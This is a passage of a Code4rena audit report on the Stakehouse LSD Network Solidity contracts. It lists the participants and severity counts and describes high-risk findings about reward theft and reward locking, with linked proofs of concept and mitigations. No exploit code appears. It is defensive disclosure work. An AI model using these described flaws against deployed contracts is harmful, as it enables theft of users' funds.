{
  "circa": {
    "title": "LSD Network - Stakehouse contest",
    "sponsor": "Stakehouse Protocol",
    "slug": "2022-11-stakehouse",
    "date": "2023-01-20",
    "findings": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues",
    "contest": 182
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the LSD Network - Stakehouse smart contract system written in Solidity. The audit contest took place between November 11—November 18 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>98 Wardens contributed reports to the LSD Network - Stakehouse contest:</p>\n<ol>\n<li>0x4non</li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li>0xPanda</li>\n<li><a href=\"https://twitter.com/0xRoxas\">0xRoxas</a></li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>0xbepresent</li>\n<li>0xdeadbeef0x</li>\n<li>0xmuxyz</li>\n<li>9svR6w</li>\n<li>Awesome</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>B2</li>\n<li>Bnke0x0</li>\n<li>CloudX (<a href=\"https://twitter.com/angel_tripi\">Migue</a>, pabliyo, and marce1993)</li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li>Diana</li>\n<li><a href=\"https://franfran.dev/\">Franfran</a></li>\n<li>HE1M</li>\n<li>IllIllI</li>\n<li>JTJabba</li>\n<li><a href=\"https://jeiwan.net\">Jeiwan</a></li>\n<li>Josiah</li>\n<li>Lambda</li>\n<li>RaymondFam</li>\n<li>ReyAdmirado</li>\n<li>Rolezn</li>\n<li>SaeedAlipoor01988</li>\n<li>Saintcode_</li>\n<li><a href=\"https://www.linkedin.com/in/sathishkumar-p-26069915a\">Sathish9098</a></li>\n<li>Secureverse (imkapadia, Nsecv, and leosathya)</li>\n<li>SmartSek (0xDjango and hake)</li>\n<li><a href=\"https://twitter.com/trust__90\">Trust</a></li>\n<li><a href=\"https://github.com/udsene\">Udsen</a></li>\n<li>V_B (Barichek and vlad_bochok)</li>\n<li><a href=\"https://twitter.com/a12jmx\">a12jmx</a></li>\n<li>aphak5010</li>\n<li>arcoun</li>\n<li><a href=\"https://twitter.com/0xbanky\">banky</a></li>\n<li>bearonbike</li>\n<li><a href=\"https://twitter.com/Bharg4v\">bharg4v</a></li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>bitbopper</li>\n<li>brgltd</li>\n<li>btk</li>\n<li>bulej93</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li>c7e7eff</li>\n<li>cccz</li>\n<li>ch0bu</li>\n<li>chaduke</li>\n<li>chrisdior4</li>\n<li>clems4ever</li>\n<li>corerouter</li>\n<li>cryptostellar5</li>\n<li>datapunk</li>\n<li>delfin454000</li>\n<li>fs0c</li>\n<li><a href=\"https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219\">gogo</a></li>\n<li>gz627</li>\n<li>hihen</li>\n<li>hl_</li>\n<li><a href=\"https://twitter.com/0xheynacho\">ignacio</a></li>\n<li>imare</li>\n<li>immeas</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li>koxuan</li>\n<li>ladboy233</li>\n<li>lukris02</li>\n<li><a href=\"https://github.com/martin-petrov03\">martin</a></li>\n<li>minhtrng</li>\n<li><a href=\"https://twitter.com/0xnogo\">nogo</a></li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li>pashov</li>\n<li><a href=\"https://twitter.com/@PavanKumarKv2\">pavankv</a></li>\n<li>peanuts</li>\n<li>pedr02b2</li>\n<li>perseverancesuccess</li>\n<li>rbserver</li>\n<li>ronnyx2017</li>\n<li>rotcivegaf</li>\n<li>sahar</li>\n<li>sakman</li>\n<li>satoshipotato</li>\n<li>shark</li>\n<li>skyle</li>\n<li>tnevler</li>\n<li>trustindistrust</li>\n<li>unforgiven</li>\n<li>wait</li>\n<li>yixxas</li>\n<li>zaskoh</li>\n<li>zgo</li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/lsdan_defi\">LSDan</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a> and <a href=\"https://twitter.com/CloudEllie1\">CloudEllie</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 52 unique vulnerabilities. Of these vulnerabilities, 21 received a risk rating in the category of HIGH severity and 31 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 60 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 18 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-11-stakehouse\">C4 LSD Network - Stakehouse contest repository</a>, and is composed of 21 smart contracts written in the Solidity programming language and includes 2,269 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-21\" style=\"position:relative;\"><a href=\"#high-risk-findings-21\" aria-label=\"high risk findings 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (21)</h1>\n<h2 id=\"h-01-any-user-being-the-first-to-claim-rewards-from-giantmevandfeespool-can-unexepectedly-collect-them-all\" style=\"position:relative;\"><a href=\"#h-01-any-user-being-the-first-to-claim-rewards-from-giantmevandfeespool-can-unexepectedly-collect-them-all\" aria-label=\"h 01 any user being the first to claim rewards from giantmevandfeespool can unexepectedly collect them all permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/32\">[H-01] Any user being the first to claim rewards from <code>GiantMevAndFeesPool</code> can unexepectedly collect them all</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/32\">clems4ever</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203</a><br></p>\n<p>Any user being the first to claim rewards from GiantMevAndFeesPool, can get all the previously generated rewards whatever the amount and even if he did not participate to generate those rewards…</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://gist.github.com/clems4ever/c9fe06ce454ff6c4124f4bd29d3598de\">https://gist.github.com/clems4ever/c9fe06ce454ff6c4124f4bd29d3598de</a></p>\n<p>Copy paste it in the test suite and run it.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>forge test</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Rework the way <code>accumulatedETHPerLPShare</code> and <code>claimed</code> is used. There are multiple bugs due to the interaction between those variables as you will see in my other reports.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/32\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-02-rewards-of-giantmevandfeespool-can-be-locked-for-all-users\" style=\"position:relative;\"><a href=\"#h-02-rewards-of-giantmevandfeespool-can-be-locked-for-all-users\" aria-label=\"h 02 rewards of giantmevandfeespool can be locked for all users permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/33\">[H-02] Rewards of <code>GiantMevAndFeesPool</code> can be locked for all users</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/33\">clems4ever</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L172\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L172</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L8\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L8</a><br></p>\n<p>Any malicious user could make the rewards in GiantMevAndFeesPool inaccessible to all other users…</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://gist.github.com/clems4ever/9b05391cc2192c1b6e8178faa38dfe41\">https://gist.github.com/clems4ever/9b05391cc2192c1b6e8178faa38dfe41</a></p>\n<p>Copy the file in the test suite and run the test.</p>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>forge test</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Protect the inherited functions of the ERC20 tokens (GiantLP and LPToken) because <code>transfer</code> is not protected and can trigger the <code>before</code> and <code>after</code> hooks. There is the same issue with LPToken and StakingFundsVault.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/33\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-03-theft-of-eth-of-free-floating-slot-holders\" style=\"position:relative;\"><a href=\"#h-03-theft-of-eth-of-free-floating-slot-holders\" aria-label=\"h 03 theft of eth of free floating slot holders permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/40\">[H-03] Theft of ETH of free floating SLOT holders</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/40\">clems4ever</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/86\">HE1M</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L369\">https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L369</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L668\">https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L668</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228\">https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228</a><br></p>\n<p>A malicious user can steal all claimable ETH belonging to free floating SLOT holders…</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://gist.github.com/clems4ever/f1149743897b2620eab0734f88208603\">https://gist.github.com/clems4ever/f1149743897b2620eab0734f88208603</a></p>\n<p>Run it in the test suite with forge</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual review / forge</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><code>+=</code> operator instead of <code>=</code> in <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228\">https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228</a> ?</p>\n<p>The logic for keeping the rewards up-to-date is also quite complex in my opinion. The main thing that triggered it for me was the lazy call to <code>updateAccruedETHPerShares</code>. Why not keep the state updated after each operation instead?</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/40\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-04-unstaking-does-not-update-the-mapping-sethuserclaimforknot\" style=\"position:relative;\"><a 